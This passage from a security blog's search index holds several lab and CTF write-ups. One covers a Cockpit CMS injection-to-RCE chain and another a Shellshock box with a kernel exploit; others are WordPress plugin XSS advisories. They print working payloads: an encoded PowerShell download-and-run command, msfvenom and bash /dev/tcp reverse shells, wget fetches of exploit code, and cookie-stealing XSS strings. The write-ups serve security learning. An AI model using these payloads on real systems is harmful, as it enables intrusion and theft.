\"ricardo\" string(5) \"laura\" string(6) \"steven\" [SNIP]      Extracting password reset tokens, Cockpit, like many other web applications, allows resetting account passwords.   NoSQL injection in /auth/resetpassword (CVE-2020-35847), resetpassword method of the Auth controller, which is responsible for changing the user password using the reset token:         User account compromise. Now, being able to get password reset tokens, we can compromise any user account we are interested in. This takes just a few steps:   – Access /auth/requestreset to generate a token for resetting the password of the selected user:   user: ricardo    user: laura    user: steven    – Extract tokens by using one of the methods just described (/auth/resetpassword or /auth/newpassword):      Now we have 3 tokens reset password for each users.   – Extract user account data (username, password hash, API key, password reset token) using the /auth/newpassword method and the password reset tokens obtained in the previous step:   Extracting user account ricardo    Okay, ricardo is an admin, because from the information ricardo in admin group   \"user\":\"ricardo\",\"name\":\"Ricardo\",\"email\":\"ricardo@mail.htb\",\"active\":true,\"group\":\"admin\",   With this data in hand, we can then:     Use the application with the API key.   Bruteforce the account password from the hash.   Change the account password by using the /auth/resetpassword method:      Remote Code Execution   Let’s login as ricardo:passwd123, and upload a php reverse shell script, we used PHP injection in the UtilArrayQuery::buildCondition method of the MongoLite library To demonstrate the vulnerability, we will use the /accounts/find method (authentication required). change request to POST, and change Content-Type: application/json.  { \"options\":{     \"filter\":{         \"'+ die(`dir`) + '\":0 } } }  check directory list dir    check user whoami    Gaining Access  we will upload nishang reverse shell /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1, add Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.172 -Port 4444 on the script.   use this command iex(iwr -usebasicparsing http://10.10.14.172/Invoke-PowerShellTcp.ps1) encode using https://raikia.com/tool-powershell-encoder/   and our poweshell script  powershell -enc aQBlAHgAKABpAHcAcgAgAC0AdQBzAGUAYgBhAHMAaQBjAHAAYQByAHMAaQBuAGcAIABoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADEANwAyAC8ASQBuAHYAbwBrAGUALQBQAG8AdwBlAHIAUwBoAGUAbABsAFQAYwBwAC4AcABzADEAKQA=     prepare python3 web server on our kali linux sudo python3 -m http.server 80,      and run netcat listener nc -lvnp 4444         Privilege Escalation  Let’s upload, and run winPEASany.exe  PS C:\\&gt; mkdir temp      Directory: C:\\  Mode                LastWriteTime         Length Name                                                                   ----                -------------         ------ ----                                                                   d-----        7/27/2021   6:40 AM                temp                                                                    PS C:\\&gt; cd temp PS C:\\temp&gt; (new-object net.webclient).downloadfile('http://10.10.14.172/winPEASany.exe', 'C:\\temp\\winPEASany.exe') PS C:\\temp&gt; ./winPEASany.exe  we found parkor creds    Veyon Service    Service Exploits - Unquoted Service Path   From veyon service sc.exe qc VeyonService  PS C:\\temp&gt; sc.exe qc VeyonService [SC] QueryServiceConfig SUCCESS  SERVICE_NAME: VeyonService         TYPE               : 10  WIN32_OWN_PROCESS          START_TYPE         : 2   AUTO_START         ERROR_CONTROL      : 1   NORMAL         BINARY_PATH_NAME   : C:\\Program Files\\Veyon\\Veyon Service\\Veyon\\veyon-service.exe         LOAD_ORDER_GROUP   :          TAG                : 0         DISPLAY_NAME       : Veyon Service         DEPENDENCIES       : Tcpip                            : RpcSs         SERVICE_START_NAME : LocalSystem PS C:\\temp&gt;   create msfvenom exploit  $ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.172 LPORT=4445 -f exe &gt; Veyon.exe [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x64 from the payload No encoder specified, outputting raw payload Payload size: 460 bytes Final size of exe file: 7168 bytes  transfer to C:\\Program Files\\Veyon\\  PS C:\\temp&gt; (new-object net.webclient).downloadfile('http://10.10.14.172/Veyon.exe', 'C:\\Program Files\\Veyon\\Veyon.exe') PS C:\\temp&gt; dir \"C:\\Program Files\\Veyon\\\"       Directory: C:\\Program Files\\Veyon   Mode                LastWriteTime         Length Name                                                                   ----                -------------         ------ ----                                                                   d-----        6/25/2021   4:02 AM                Veyon Service                                                          -a----        7/27/2021   7:01 AM           7168 Veyon.exe                                                                PS C:\\temp&gt;    Restart Veyon Service, and start a listener on kali linux nc -lvnp 4445  PS C:\\temp&gt; sc.exe stop VeyonService  SERVICE_NAME: VeyonService          TYPE               : 10  WIN32_OWN_PROCESS           STATE              : 3  STOP_PENDING                                  (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)         WIN32_EXIT_CODE    : 0  (0x0)         SERVICE_EXIT_CODE  : 0  (0x0)         CHECKPOINT         : 0x2         WAIT_HINT          : 0x0 PS C:\\temp&gt; sc.exe start VeyonService    ","categories": ["HackTheBox","HackTheBox Business CTF 2021","CTF"],
        "tags": ["HackTheBox Business CTF 2021","Cockpit CMS","CVE-2020-35846","CVE-2020-35847","CVE-2020-35848"],
        "url": "http://localhost:4000/hackthebox/hackthebox%20business%20ctf%202021/ctf/htbbiz2021-parkor/",
        "teaser": "http://localhost:4000/assets/images/htb-frame.png"
      },{
        "title": "TryHackMe - 0day",
        "excerpt":"This room was created by 0day, we can access on the tryhackme. 0day machine has a famous vulnerability called Shell Shock CVE-2014-6278 2014-6271, and from the machine teach us how to enumerate using nikto, how to exploit cgi-bin path, and how to escalate privilege access use 'overlayfs' Local Privilege Escalation(CVE-2015-1328).   Network Scanning  First, we need to find open ports, services from the target machine using command sudo nmap -sC -sV -T4 -A --vv 10.10.26.88 -oN nmap_0day  $ sudo nmap -sC -sV -T4 -A --vv 10.10.26.88 -oN nmap_0day # Nmap 7.91 scan initiated Sun Aug  1 17:37:16 2021 as: nmap -sC -sV -T4 -A --vv -oN nmap_0day 10.10.26.88 Nmap scan report for 10.10.26.88 Host is up, received echo-reply ttl 61 (0.39s latency). Scanned at 2021-08-01 17:37:16 WIB for 61s Not shown: 998 closed ports Reason: 998 resets PORT   STATE SERVICE REASON         VERSION 22/tcp open  ssh     syn-ack ttl 61 OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0) | ssh-hostkey:  |   1024 57:20:82:3c:62:aa:8f:42:23:c0:b8:93:99:6f:49:9c (DSA) | ssh-dss AAAAB3NzaC1kc3MAAACBAPcMQIfRe52VJuHcnjPyvMcVKYWsaPnADsmH+FR4OyR5lMSURXSzS15nxjcXEd3i9jk14amEDTZr1zsapV1Ke2Of/n6V5KYoB7p7w0HnFuMriUSWStmwRZCjkO/LQJkMgrlz1zVjrDEANm3fwjg0I7Ht1/gOeZYEtIl9DRqRzc1ZAAAAFQChwhLtInglVHlWwgAYbni33wUAfwAAAIAcFv6QZL7T2NzBsBuq0RtlFux0SAPYY2l+PwHZQMtRYko94NUv/XUaSN9dPrVKdbDk4ZeTHWO5H6P0t8LruN/18iPqvz0OKHQCgc50zE0pTDTS+GdO4kp3CBSumqsYc4nZsK+lyuUmeEPGKmcU6zlT03oARnYA6wozFZggJCUG4QAAAIBQKMkRtPhl3pXLhXzzlSJsbmwY6bNRTbJebGBx6VNSV3imwPXLR8VYEmw3O2Zpdei6qQlt6f2S3GaSSUBXe78h000/JdckRk6A73LFUxSYdXl1wCiz0TltSogHGYV9CxHDUHAvfIs5QwRAYVkmMe2H+HSBc3tKeHJEECNkqM2Qiw== |   2048 4c:40:db:32:64:0d:11:0c:ef:4f:b8:5b:73:9b:c7:6b (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCwY8CfRqdJ+C17QnSu2hTDhmFODmq1UTBu3ctj47tH/uBpRBCTvput1+++BhyvexQbNZ6zKL1MeDq0bVAGlWZrHdw73LCSA1e6GrGieXnbLbuRm3bfdBWc4CGPItmRHzw5dc2MwO492ps0B7vdxz3N38aUbbvcNOmNJjEWsS86E25LIvCqY3txD+Qrv8+W+Hqi9ysbeitb5MNwd/4iy21qwtagdi1DMjuo0dckzvcYqZCT7DaToBTT77Jlxj23mlbDAcSrb4uVCE538BGyiQ2wgXYhXpGKdtpnJEhSYISd7dqm6pnEkJXSwoDnSbUiMCT+ya7yhcNYW3SKYxUTQzIV |   256 f7:6f:78:d5:83:52:a6:4d:da:21:3c:55:47:b7:2d:6d (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKF5YbiHxYqQ7XbHoh600yn8M69wYPnLVAb4lEASOGH6l7+irKU5qraViqgVR06I8kRznLAOw6bqO2EqB8EBx+E= |   256 a5:b4:f0:84:b6:a7:8d:eb:0a:9d:3e:74:37:33:65:16 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIItaO2Q/3nOu5T16taNBbx5NqcWNAbOkTZHD2TB1FcVg 80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.7 ((Ubuntu)) | http-methods:  |_  Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.7 (Ubuntu) |_http-title: 0day OS fingerprint not ideal because: maxTimingRatio (1.854000e+00) is greater than 1.4 Aggressive OS guesses: Linux 3.10 - 3.13 (95%), Linux 5.4 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Sony Android TV (Android 5.0) (92%), Android 5.0 - 6.0.1 (Linux 3.4) (92%), Android 5.1 (92%) No exact OS matches for host (test conditions non-ideal). TCP/IP fingerprint: SCAN(V=7.91%E=4%D=8/1%OT=22%CT=1%CU=32594%PV=Y%DS=4%DC=T%G=N%TM=61067999%P=x86_64-pc-linux-gnu) SEQ(SP=104%GCD=1%ISR=108%TI=Z%CI=I%II=I%TS=8) SEQ(SP=104%GCD=1%ISR=108%TI=Z%CI=I%TS=8) OPS(O1=M505ST11NW6%O2=M505ST11NW6%O3=M505NNT11NW6%O4=M505ST11NW6%O5=M505ST11NW6%O6=M505ST11) WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF) ECN(R=Y%DF=Y%T=40%W=6903%O=M505NNSNW6%CC=Y%Q=) T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=) T2(R=N) T3(R=N) T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=) T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=) T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=) T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=) U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G) IE(R=Y%DFI=N%T=40%CD=S)  Uptime guess: 204.567 days (since Sat Jan  9 04:01:07 2021) Network Distance: 4 hops TCP Sequence Prediction: Difficulty=258 (Good luck!) IP ID Sequence Generation: All zeros Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  TRACEROUTE (using port 53/tcp) HOP RTT       ADDRESS 1   254.58 ms 10.2.0.1 2   ... 3 4   381.57 ms 10.10.26.88  Read data files from: /usr/bin/../share/nmap OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sun Aug  1 17:38:17 2021 -- 1 IP address (1 host up) scanned in 61.33 seconds  From nmap’s result we found two tcp open ports includes the services   Enumeration  Port 22 from nmap result gave the information about version OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0), but the version was not has a vulnerability, so we need to look forward to the port 80   Port 80 is another open port from target machine with web technology using Apache httpd 2.4.7 ((Ubuntu)). The version of web server tecnology was not vulnerable. Next step is we need to enumerate information deeply using nikto and enumerate directory using ffuf.  $ nikto -host 10.10.26.88                  - Nikto v2.1.6 --------------------------------------------------------------------------- + Target IP:          10.10.26.88 + Target Hostname:    10.10.26.88 + Target Port:        80 + Start Time:         2021-08-01 17:38:10 (GMT7) --------------------------------------------------------------------------- + Server: Apache/2.4.7 (Ubuntu) + The anti-clickjacking X-Frame-Options header is not present. + The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS + The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type + Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch. + Server may leak inodes via ETags, header found with file /, inode: bd1, size: 5ae57bb9a1192, mtime: gzip + Uncommon header '93e4r0-cve-2014-6278' found, with contents: true + OSVDB-112004: /cgi-bin/test.cgi: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271). + Allowed HTTP Methods: GET, HEAD, POST, OPTIONS  + OSVDB-3092: /admin/: This might be interesting... + OSVDB-3092: /backup/: This might be interesting... + OSVDB-3268: /css/: Directory indexing found. + OSVDB-3092: /css/: This might be interesting... + OSVDB-3268: /img/: Directory indexing found. + OSVDB-3092: /img/: This might be interesting... + OSVDB-3092: /secret/: This might be interesting... + OSVDB-3092: /cgi-bin/test.cgi: This might be interesting... + OSVDB-3233: /icons/README: Apache default file found. + ERROR: Error limit (20) reached for host, giving up. Last error: opening stream: can't connect (timeout): Operation now in progress + Scan terminated:  19 error(s) and 17 item(s) reported on remote host + End Time:           2021-08-01 18:20:49 (GMT7) (2559 seconds) --------------------------------------------------------------------------- + 1 host(s) tested  From nikto result we found directory/path /cgi-bin/test.cgi, and nikto detected it a shell shock vulnerability.  $ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.26.88/FUZZ -mc 200,301,302 -e .php,.txt,.html -fs 3025          /'___\\  /'___\\           /'___\\               /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/               \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\               \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/                \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\                  \\/_/    \\/_/   \\/___/    \\/_/                v1.3.0-git ________________________________________________   :: Method           : GET  :: URL              : http://10.10.26.88/FUZZ  :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  :: Extensions       : .php. txt. html   :: Follow redirects : false  :: Calibration      : false  :: Timeout          : 10  :: Threads          : 40  :: Matcher          : Response status: 200,301,302  :: Filter           : Response size: 3025 ________________________________________________  cgi-bin                 [Status: 301, Size: 311, Words: 20, Lines: 10] img                     [Status: 301, Size: 307, Words: 20, Lines: 10] uploads                 [Status: 301, Size: 311, Words: 20, Lines: 10] admin                   [Status: 301, Size: 309, Words: 20, Lines: 10] css                     [Status: 301, Size: 307, Words: 20, Lines: 10] js                      [Status: 301, Size: 306, Words: 20, Lines: 10] backup                  [Status: 301, Size: 310, Words: 20, Lines: 10] secret                  [Status: 301, Size: 310, Words: 20, Lines: 10]  The result from ffuf, we found “interesting” directories/paths, but we focused on shellshock with the vulnerable path is /cgi-bin/test.cgi. Let’s search the shellshock exploit script using searchploit.  $ searchsploit shellshock                             -------------------------------------------------------------------------------- ---------------------------------  Exploit Title                                                                  |  Path -------------------------------------------------------------------------------- --------------------------------- Advantech Switch - 'Shellshock' Bash Environment Variable Command Injection (Me | cgi/remote/38849.rb Apache mod_cgi - 'Shellshock' Remote Command Injection                          | linux/remote/34900.py Bash - 'Shellshock' Environment Variables Command Injection                     | linux/remote/34766.php Bash CGI - 'Shellshock' Remote Command Injection (Metasploit)                   | cgi/webapps/34895.rb Cisco UCS Manager 2.1(1b) - Remote Command Injection (Shellshock)               | hardware/remote/39568.py dhclient 4.1 - Bash Environment Variable Command Injection (Shellshock)         | linux/remote/36933.py GNU Bash - 'Shellshock' Environment Variable Command Injection                  | linux/remote/34765.txt IPFire - 'Shellshock' Bash Environment Variable Command Injection (Metasploit)  | cgi/remote/39918.rb NUUO NVRmini 2 3.0.8 - Remote Command Injection (Shellshock)                    | cgi/webapps/40213.txt OpenVPN 2.2.29 - 'Shellshock' Remote Command Injection                          | linux/remote/34879.txt PHP &lt; 5.6.2 - 'Shellshock' Safe Mode / disable_functions Bypass / Command Injec | php/webapps/35146.txt Postfix SMTP 4.2.x &lt; 4.2.48 - 'Shellshock' Remote Command Injection             | linux/remote/34896.py RedStar 3.0 Server - 'Shellshock' 'BEAM' / 'RSSMON' Command Injection           | linux/local/40938.py SonicWall SSL-VPN 8.0.0.0 - 'shellshock/visualdoor' Remote Code Execution (Unau | hardware/webapps/49499.py Sun Secure Global Desktop and Oracle Global Desktop 4.61.915 - Command Injectio | cgi/webapps/39887.txt TrendMicro InterScan Web Security Virtual Appliance - 'Shellshock' Remote Comma | hardware/remote/40619.py -------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results  Apache mod_cgi - ‘Shellshock’ Remote Command Injection. Let’s copy the exploit script linux/remote/34900.py to our local machine (kali linux)  $ searchsploit -m linux/remote/34900.py    Exploit: Apache mod_cgi - 'Shellshock' Remote Command Injection       URL: https://www.exploit-db.com/exploits/34900      Path: /usr/share/exploitdb/exploits/linux/remote/34900.py File Type: Python script, ASCII text executable, with CRLF line terminators  Copied to: /twseptian/lab/tryhackme/room/0day/34900.py  Gaining Access  On the script add /cgi-bin/test.cgi as the vulnerable file  [SNIP] except: \tpages = [\"/cgi-bin/test.cgi\",\"/cgi-sys/entropysearch.cgi\",\"/cgi-sys/defaultwebpage.cgi\",\"/cgi-mod/index.cgi\",\"/cgi-bin/test.cgi\",\"/cgi-bin-sdb/printenv\"] try: [SNIP]  after we modified exploit python script, then run the exploit with command python2.7 34900.py payload=reverse rhost=10.10.26.88 lhost=10.2.81.7 lport=4444  $ python2.7 34900.py payload=reverse rhost=10.10.26.88 lhost=10.2.81.7 lport=4444                           1 ⨯ [!] Started reverse shell handler [-] Trying exploit on : /cgi-bin/test.cgi [!] Successfully exploited [!] Incoming connection from 10.10.26.88 10.10.26.88&gt; id uid=33(www-data) gid=33(www-data) groups=33(www-data)  10.10.26.88&gt; bash -i &gt;&amp; /dev/tcp/10.2.81.7/4445 0&gt;&amp;1 10.10.26.88&gt;   To have tty shell from target, we tried to create another reverse shell connection bash -i &gt;&amp; /dev/tcp/10.2.81.7/4445 0&gt;&amp;1 and prepare netcat listener nc -lvnp 4445  $ nc -lvnp 4445                                                                                           130 ⨯ Ncat: Version 7.91 ( https://nmap.org/ncat ) Ncat: Listening on :::4445 Ncat: Listening on 0.0.0.0:4445 Ncat: Connection from 10.10.26.88. Ncat: Connection from 10.10.26.88:57527. bash: cannot set terminal process group (854): Inappropriate ioctl for device bash: no job control in this shell www-data@ubuntu:/usr/lib/cgi-bin$ ls -la ls -la total 12 drwxr-xr-x  2 root root 4096 Sep  2  2020 . drwxr-xr-x 54 root root 4096 Sep  2  2020 .. -rwxr-xr-x  1 root root   73 Sep  2  2020 test.cgi www-data@ubuntu:/usr/lib/cgi-bin$ whoami whoami www-data www-data@ubuntu:/usr/lib/cgi-bin$  After we got tty shell interface, and next we need enumerate /etc/passwd to get the information about all users on target machine  www-data@ubuntu:/usr/lib/cgi-bin$ cat /etc/passwd cat /etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin libuuid:x:100:101::/var/lib/libuuid: syslog:x:101:104::/home/syslog:/bin/false messagebus:x:102:105::/var/run/dbus:/bin/false ryan:x:1000:1000:Ubuntu 14.04.1,,,:/home/ryan:/bin/bash sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin  the local user is ryan with /home/ryan directory, and we can see flag on the directory  www-data@ubuntu:/usr/lib/cgi-bin$ cd /home/ryan cd /home/ryan www-data@ubuntu:/home/ryan$ ls -la ls -la total 28 drwxr-xr-x 3 ryan ryan 4096 Sep  2  2020 . drwxr-xr-x 3 root root 4096 Sep  2  2020 .. lrwxrwxrwx 1 ryan ryan    9 Sep  2  2020 .bash_history -&gt; /dev/null -rw-r--r-- 1 ryan ryan  220 Sep  2  2020 .bash_logout -rw-r--r-- 1 ryan ryan 3637 Sep  2  2020 .bashrc drwx------ 2 ryan ryan 4096 Sep  2  2020 .cache -rw-r--r-- 1 ryan ryan  675 Sep  2  2020 .profile -rw-rw-r-- 1 ryan ryan   22 Sep  2  2020 user.txt www-data@ubuntu:/home/ryan$ cat user.txt cat user.txt THM{Sh3llSh0ck_r0ckz} www-data@ubuntu:/home/ryan$   Privilege Escalation  Check kernel version using command uname -a  www-data@ubuntu:/usr/lib/cgi-bin$ uname -a uname -a Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux www-data@ubuntu:/usr/lib/cgi-bin$   From the kernel version,machine has a vulnerable Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - ‘overlayfs’ Local Privilege Escalation(CVE-2015-1328). Let’s download exploit from exploit-db to our kali machine,and then transfer to target machine  www-data@ubuntu:/tmp$ wget http://10.2.81.7/37292.c wget http://10.2.81.7/37292.c --2021-08-01 05:00:03--  http://10.2.81.7/37292.c Connecting to 10.2.81.7:80... connected. HTTP request sent, awaiting response... 200 OK Length: 5119 (5.0K) [text/x-csrc] Saving to: '37292.c'       0K ....                                                  100% 13.0M=0s  2021-08-01 05:00:04 (13.0 MB/s) - '37292.c' saved [5119/5119]  We have some error when exploit.c was compiled  www-data@ubuntu:/tmp$ gcc 37292.c -o ofs gcc 37292.c -o ofs gcc: error trying to exec 'cc1': execvp: No such file or directory www-data@ubuntu:/tmp$   To fix the error, we need to export the binpath from the machine target using command export PATH=/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin  www-data@ubuntu:/tmp$ export PATH=/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin &lt;t PATH=/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin          www-data@ubuntu:/tmp$   and let’s try to recompile again the exploit script,then run the executable exploit  www-data@ubuntu:/tmp$ gcc 37292.c -o ofs gcc 37292.c -o ofs www-data@ubuntu:/tmp$  we got root access and flag      ","categories": ["TryHackMe"],
        "tags": ["Kernel Exploit","Shell Shock","CVE-2015-1328","CVE-2014-6278 2014-6271"],
        "url": "http://localhost:4000/tryhackme/thm-0day/",
        "teaser": "http://localhost:4000/assets/images/teaser.png"
      },{
        "title": "Book appointment Online < 1.39 - Authenticated Stored Cross-Site Scripting (XSS)",
        "excerpt":"Description  The plugin does not sanitise or escape Service Prices before outputting it in the List, which could allow high privilege users to perform Cross-Site Scripting attacks even when the unfiltered_html capability is disallowed.   Proof of Concept  In the admin dashboard navigate to Services &gt; Add service and put the following payload in the Price (Service Params section):   &lt;script&gt;alert('test')&lt;/script&gt;  The XSS will be triggered in the Services list /wp-admin/edit.php?post_type=services   Timeline     Publicly Published : 2021-08-10 (about 1 months ago)   Added : 2021-08-10 (about 1 months ago)   Last Updated : 2021-08-10 (about 1 months ago)   Links     Book appointment Online &lt; 1.39 - Authenticated Stored Cross-Site Scripting (XSS)   CVE-2021-24614  ","categories": ["CVE"],
        "tags": ["CVE"],
        "url": "http://localhost:4000/cve/CVE-2021-24614/",
        "teaser": "http://localhost:4000/assets/images/wordpress-plugins-vuln.jpg"
      },{
        "title": "WP Courses LMS < 2.0.44 - Authenticated Stored XSS via Video Embed Code",
        "excerpt":"Description  The plugin does not sanitise its Video Embed Code, allowing malicious code to be injected in it by high privilege users, even when the unfiltered_html capability is disallowed, which could lead to Stored Cross-Site Scripting issues   Proof of Concept  On the dashboard, navigate to WP Courses &gt; Courses &gt; Add New &gt; Video Embed Code (iframe) (in the Post settings), inject with &lt;iframe&gt; XSS payload, such as   &lt;iframe src=\"javascript:alert(document.cookie)\"&gt;&lt;/iframe&gt;;&lt;iframe src=\"javascript:%61%6c%65%72%74%28%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%29\"&gt;&lt;/iframe&gt;  Then, click Update, and to trigger XSS payload, open URL path of course   Timeline     Publicly Published : 2021-08-16 (about 1 months ago)   Added : 2021-08-16 (about 1 months ago)   Last Updated : 2021-08-16 (about 1 months ago)   Links     WP Courses LMS &lt; 2.0.44 - Authenticated Stored XSS via Video Embed Code   CVE-2021-24621  ","categories": ["CVE"],
        "tags": ["CVE"],
        "url": "http://localhost:4000/cve/CVE-2021-24621/",
        "teaser": "http://localhost:4000/assets/images/wordpress-plugins-vuln.jpg"
      },{
        "title": "WP Ticket < 5.10.4 - Admin+ Stored Cross-Site Scripting",
        "excerpt":"Description  The plugin does not sanitize or escape form fields before outputting it in the List, which could allow high privilege users to perform Cross-Site Scripting attacks even when the unfiltered_html capability is disallowed.   Proof of Concept  Navigate to WP Ticket &gt; Forms &gt;  edit layout of \"Open a Ticket\" or \"Search Tickets\" &gt; on \"Editing Form\" Setting menu.   Select a form field and you can edit the “Label” with a cross-site scripting (XSS) payload such as  v &lt; 5.10.3 - \"&gt;&lt;script&gt;alert(/XSS/)&lt;/script&gt;  v &lt;= 5.10.3 - \" style=animation-name:rotation onanimationstart=alert(/XSS/)//  All of the parameters on the “Editing Form” are vulnerable.To trigger the XSS payload, refresh the “Editing Form” page.   Timeline     Publicly Published : 2021-09-20 (about 11 days ago)   Added : 2021-09-20 (about 11 days ago)   Last Updated : 2021-09-20 (about 11 days ago)   Links     WP Ticket &lt; 5.10.4 - Admin+ Stored Cross-Site Scripting   CVE-2021-24622  ","categories": ["CVE"],
        "tags": ["CVE"],
        "url": "http://localhost:4000/cve/CVE-2021-24622/",
        "teaser": "http://localhost:4000/assets/images/wordpress-plugins-vuln.jpg"
      },{
        "title": "WordPress Advanced Ticket System < 1.0.64 - Authenticated Stored Cross-Site Scripting (XSS)",
        "excerpt":"Description  The plugin does not sanitize or escape form values before saving to the database or when outputting, which allows high privilege users to perform Cross-Site Scripting attacks even when the unfiltered_html capability is disallowed.   Proof of Concept  Navigate to Tickets &gt; Add New &gt;  add all information on the title, post, Ticket type, Ticket priority, Ticket status &gt; click update and intercept the request using burp suite. The parameters \"wats_select_ticket_type\", \"wats_select_ticket_priority\", \"wats_select_ticket_status\" can be injected with cross-site scripting (XSS), such as test\"&gt;&lt;script&gt;alert('test')&lt;/script&gt;; test\"&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt; payload. Next Click Forward on burp suite. To trigger the XSS payload, Open the permalink post/ticket page.   Timeline     Publicly Published : 2021-08-16 (about 1 months ago)   Added : 2021-08-16 (about 1 months ago)   Last Updated : 2021-08-16 (about 1 months ago)   Links     WordPress Advanced Ticket System &lt; 1.0.64 - Authenticated Stored Cross-Site Scripting (XSS)   CVE-2021-24623  ","categories": ["CVE"],
        "tags": ["CVE"],
        "url": "http://localhost:4000/cve/CVE-2021-24623/",
        "teaser": "http://localhost:4000/assets/images/wordpress-plugins-vuln.jpg"
      },{
        "title": "Spring Boot Log4j - CVE-2021-44228",
        "excerpt":"Description  The Log4Shell vulnerability (CVE-2021-44228) ultimately is a quite simple JNDI Injection flaw, but in a really really bad place. Log4J will perform a JNDI lookup() while expanding placeholders in logging messages (or indirectly as parameters for formatted messages) - readmore PSA: Log4Shell and the current state of JNDI injection.   For information and setup, let’s navigate to my github repository Spring Boot Log4j - CVE-2021-44228   References     Log4Shell: RCE 0-day exploit found in log4j 2, a popular Java logging package   PSA: Log4Shell and the current state of JNDI injection   Log4Shell sample vulnerable application (CVE-2021-44228)   JNDIExploit Update (Dec 13th): The JNDIExploit repository has been removed from GitHub  ","categories": ["CVE"],
        "tags": ["CVE","CVE-2021-44228","Log4Shell","Log4j"],
        "url": "http://localhost:4000/cve/CVE-2021-44228/",
        "teaser": "http://localhost:4000/assets/images/log4j/log4j-apache-vulnerability-software.jpg"
      },{
        "title": "Hospitals Patient Records Management System 1.0 - Account TakeOver",
        "excerpt":"Information about vulnerability  - Exploit Title: Hospital's Patient Records Management System v1.0 - 'id' Insecure direct object references (IDOR) leads to Account TakeOver - Date: 2021-12-30 - Exploit Author: twseptian - Vendor Homepage: https://www.sourcecodester.com/php/15116/hospitals-patient-records-management-system-php-free-source-code.html - Software Link: https://www.sourcecodester.com/sites/default/files/download/oretnom23/hprms_0.zip - Version: v1.0 - Tested on: Kali Linux 2021.4 - Exploit-DB link: https://www.exploit-db.com/exploits/50631   Insecure direct object references (IDOR)  Insecure Direct Object References (IDOR) occur when an application provides direct access to objects based on user-supplied input.Insecure Direct Object References allow attackers to bypass authorization and access resources directly by modifying the value of a parameter used to directly point to an object. Such resources can be database entries belonging to other users, files in the system.   Attack Vector  An attacker can takeover the Administrator’s account   Steps of reproduce  Note: in this case, we used two users, user1 as a staff with user id ‘4’, and admin as an Administrator with user id ‘1’.     Step-1: Log in to the application using user1 account,then on the dashboard navigate to ‘My Account’ http://localhost/hprms/admin/?page=user   